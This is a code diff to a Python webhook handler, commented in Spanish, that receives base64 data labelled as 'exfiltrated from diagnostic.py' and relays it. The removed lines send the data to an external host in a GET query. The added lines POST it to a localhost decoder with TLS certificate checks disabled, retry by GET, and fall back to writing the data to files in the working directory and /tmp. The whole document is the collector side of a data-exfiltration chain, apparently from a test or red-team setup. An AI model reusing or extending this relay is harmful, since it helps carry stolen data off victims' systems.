@@ -27,12 +27,26 @@ class WebhookHandler(BaseHTTPRequestHandler):
                 print(f"[+] Data received at local webhook!")
                 print(f"[+] Data length: {len(received_data)} bytes")
                 
-                # Intentar reenviar al webhook externo
-                print(f"[+] Attempting to forward to https://news.reimbursor.info/status...")
-                external_url = f"https://news.reimbursor.info/status?id=data={received_data}"
+                # Intentar reenviar al webhook externo vía POST
+                print(f"[+] Attempting to forward to https://127.0.0.1:7776/decoder...")
                 
                 try:
-                    response = urllib.request.urlopen(external_url, timeout=10)
+                    # Preparar datos para POST
+                    post_data = json.dumps({"id": received_data}).encode('utf-8')
+                    req = urllib.request.Request(
+                        'https://127.0.0.1:7776/decoder',
+                        data=post_data,
+                        headers={'Content-Type': 'application/json'},
+                        method='POST'
+                    )
+                    
+                    # Desactivar verificación SSL
+                    import ssl
+                    ssl_context = ssl.create_default_context()
+                    ssl_context.check_hostname = False
+                    ssl_context.verify_mode = ssl.CERT_NONE
+                    
+                    response = urllib.request.urlopen(req, context=ssl_context, timeout=10)
                     print(f"[+] External webhook SUCCESS: {response.status}")
                     response_body = response.read().decode('utf-8', errors='replace')
                     if response_body:
@@ -40,32 +54,43 @@ class WebhookHandler(BaseHTTPRequestHandler):
                     data_sent_successfully = True
                 except Exception as external_error:
                     print(f"[!] External webhook FAILED: {external_error}")
-                    print(f"[*] Saving data to fallback locations...")
+                    print(f"[*] Trying alternative: GET with chunked data...")
                     
-                    # Guardar en múltiples ubicaciones
-                    save_locations = [
-                        "exfiltrated_data.txt",  # Local
-                        "/tmp/exfiltrated_data.txt",  # /tmp global
-                    ]
-                    
-                    for output_file in save_locations:
-                        try:
-                            with open(output_file, 'w') as f:
-                                f.write(f"# Data exfiltrated from diagnostic.py\n")
-                                f.write(f"# Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
-                                f.write(f"# Full URL:\n")
-                                f.write(f"# {external_url}\n\n")
-                                f.write(f"# Base64 Data:\n")
-                                f.write(f"{received_data}\n\n")
-                                f.write(f"# Decoded Data:\n")
-                                try:
-                                    decoded = base64.b64decode(received_data).decode('utf-8', errors='replace')
-                                    f.write(decoded)
-                                except:
-                                    f.write("Could not decode")
-                            print(f"[+] Data saved to: {output_file}")
-                        except Exception as file_error:
-                            pass
+                    # Intentar vía GET con URL directa
+                    try:
+                        external_url = f"https://127.0.0.1:7776/decoder?id={received_data}"
+                        ssl_context = ssl.create_default_context()
+                        ssl_context.check_hostname = False
+                        ssl_context.verify_mode = ssl.CERT_NONE
+                        response = urllib.request.urlopen(external_url, context=ssl_context, timeout=10)
+                        print(f"[+] GET request SUCCESS: {response.status}")
+                        data_sent_successfully = True
+                    except Exception as get_error:
+                        print(f"[!] GET request FAILED: {get_error}")
+                        print(f"[*] Saving data to fallback locations...")
+                        
+                        # Guardar en múltiples ubicaciones
+                        save_locations = [
+                            "exfiltrated_data.txt",
+                            "/tmp/exfiltrated_data.txt",
+                        ]
+                        
+                        for output_file in save_locations:
+                            try:
+                                with open(output_file, 'w') as f:
+                                    f.write(f"# Data exfiltrated from diagnostic.py\n")
+                                    f.write(f"# Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                                    f.write(f"# Base64 Data:\n")
+                                    f.write(f"{received_data}\n\n")
+                                    f.write(f"# Decoded Data:\n")
+                                    try:
+                                        decoded = base64.b64decode(received_data).decode('utf-8', errors='replace')
+                                        f.write(decoded)
+                                    except:
+                                        f.write("Could not decode")
+                                print(f"[+] Data saved to: {output_file}")
+                            except Exception as file_error:
+                                pass
         
         # Responder 200 OK
         self.send_response(200)
